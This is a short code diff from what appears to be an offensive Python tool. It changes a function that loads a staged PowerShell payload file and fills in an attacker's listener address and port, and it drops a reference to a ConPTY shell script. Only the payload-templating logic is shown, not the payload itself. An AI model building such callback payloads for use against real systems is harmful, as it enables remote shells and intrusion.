@@ -48,10 +48,10 @@ def arg_parse():
     return args
 
 def payload():
-    file = open(f'./payload.ps1', 'r')
+    file = open(f'./stage1.ps1', 'r')
     payload = file.read().strip()
     file.close()
-    payload = payload.replace('*IP*',f'{args.lhost}:{args.web_port}').replace('*FILE*','./conpty.ps1')
+    payload = payload.replace('*IP*',f'{args.lhost}:{args.web_port}')
     return payload
 
 def encode_payload(payload):
